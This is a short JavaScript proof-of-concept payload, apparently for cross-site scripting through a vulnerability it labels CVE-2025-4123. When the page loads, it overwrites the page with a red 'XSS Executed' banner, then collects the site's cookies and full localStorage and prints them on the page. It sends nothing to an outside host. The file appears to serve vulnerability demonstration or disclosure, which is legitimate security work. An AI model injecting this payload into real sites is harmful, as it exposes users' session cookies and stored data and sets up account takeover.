export function initialize() {
  // Create visual proof of code execution
  document.body.innerHTML = '<h1>XSS Executed via CVE-2025-4123</h1>';
  document.body.style.background = 'red';
  document.body.style.color = 'white';
  
  // Demonstrate access to cookies and localStorage
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    origin: window.location.origin
  };
  
  // Display the captured data
  const pre = document.createElement('pre');
  pre.textContent = JSON.stringify(data, null, 2);
  document.body.appendChild(pre);
}

initialize();
